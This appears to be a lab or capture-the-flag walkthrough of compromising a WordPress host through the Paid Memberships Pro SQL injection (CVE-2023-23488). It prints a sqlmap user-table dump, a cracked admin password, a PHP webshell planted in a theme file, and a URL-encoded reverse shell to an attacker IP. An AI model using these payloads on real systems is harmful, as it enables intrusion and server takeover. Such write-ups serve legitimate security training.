Pipe

Target IP: 192.168.146.45
Challenge Description: N/A.

Reconnaissance


Performing a TCP port scan using the command sudo nmap -sS 192.168.146.45 -p- returns the result shown in the image above. There are two TCP ports open: SSH and HTTP on their standard ports.


Performing an aggressive TCP port scansudo nmap -sV -A 192.168.146.45 -p 22,80 returns the result shown in the image above. The scan for the HTTP redirects to http://affliation.local. Time to insert this hostname inside my /etc/hosts file now.


I performed a curl request using the command curl -I http://192.168.146.45 and obtained the same result. The HTTP request gets redirected to http://affliation.local as shown in the image above on the left terminal. I inserted the new entry 192.68.146.45 affliation.local inside my /etc/hosts file.

Enumeration

Port 80: WordPress (HTTP)

After inserting the new hostname, I visited the http://affliation.local and obtained the webpage shown above. This layout is similar to WordPress application. I checked the source-code of the webpage and identified it is running WordPress. The username eren stands out to me. Is this a potential user?


To check the WordPress version, I ran Wapplyzer on the webpage and obtained the result shown above. It mentions the WordPress version is 6.2. To enumerate the WordPress application, I can use the tool wpscan.

Before performing any sophisticated scans, I performed a basic scan using the command wpscan --url http://affliation.local and obtained the result shown above. The plugin paid-memberships-pro-2.9.7 stands out tto me. While waiting for further result from the scans, I did a Google search for this plugins and identified it is vulnerable to unauthenticated SQL injection. This vulnerability has the CVE ID of CVE-2023-23488.

Exploitation & Flag

Owning the WordPress Application by Exploiting Plugin paid-memberships-pro-2.9.7 (CVE-2023-23488)


When checking for any public exploits, I found the Github repository shown in the image above. This repository contains the PoC to check whether the target is vulnerable or not. It can be found here. I made a copy of the exploit on my machine.


I ran the exploit using the command python3 exp.py http://affliation.local and obtained the result shown above. It seems like the target machine is running the vulnerable plugin paid-memberships-pro-2.9.7. This PoC also contains the commands to exploit this vulnerability, such as dumping the entire database. Since this is a time-based blind injection attack, it can be time consuming dumping the database. It is better to just dump the users database. If I dump the users database, maybe I can obtain the user credentials, crack their password hash, and login as them?


Running the command sqlmap -u "http://affliation.local/?rest_route=/pmpro/v1/order&code=a" -p code --skip-heuristics --technique=T --dbms=mysql --batch --dump -T wp_users -C user_login,user_pass returns the result shown above. There is one user called Eren and their password hash is $P$BdPMS47I2VWPAMQbidHmkga5YtOvjr.. I copied this password hash to my machine for offline cracking.


Using john and the command john hash --wordlist=/usr/share/wordlists/rockyou.txt, I managed to crack the password hash belonging to the user eren as shown in the image above. The user eren is using the password letsyouupdateyourfunnotesandmore in the WordPress application. Now I can attempt to login as this user on the WordPress application. Since this is the only user on the WordPress application, it is very likely this is the administrator too.


To login with the new credentials, I browsed to http://affliation.local/wp-admin/ and obtained the result shown in the image above.


And bingo. I am in. Now I have access to the WordPress application as the user eren, who is also the administrator here. Obtaining a reverse shell connection is the next goal now. The simplest way is to use the Theme Editor and inserting a PHP reverse shell inside a PHP page.


I inserted my PHP webshell inside the 404.php of Twenty Twenty-One theme, as shown in the image above. The simple PHP code <?php echo system($_GET['sh3ll']); ?> can be acessed and used to perform RCE. Then I pressed Update File button to make the changes.


To perform RCE, I accessed the file http://affliation.local/wp-content/themes/twentytwentyone/404.php?sh3ll=whoami;id;ls and issued the commands whoami;id;ls using the parameter name sh3ll. And bingo. I obtained the output shown above. Running whoamni shows root. Now I have a root access on the web server.


I started a listener on my machine at port 8443. Then using my webshell, I deployed the URL encoded PHP reverse shell php%20-r%20%27%24sock%3Dfsockopen%28%22192.168.45.232%22%2C8443%29%3Bshell_exec%28%22sh%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27. And I obtained a root shell access as shown in the image above on the top terminal. The flag is shown above. The full URL with encoded payload is http://affliation.local/wp-content/themes/twentytwentyone/404.php?sh3ll=php%20-r%20%27%24sock%3Dfsockopen%28%22192.168.45.232%22%2C8443%29%3Bshell_exec%28%22sh%20%3C%263%20%3E%263%202%3E%263%22%29%3B%27.
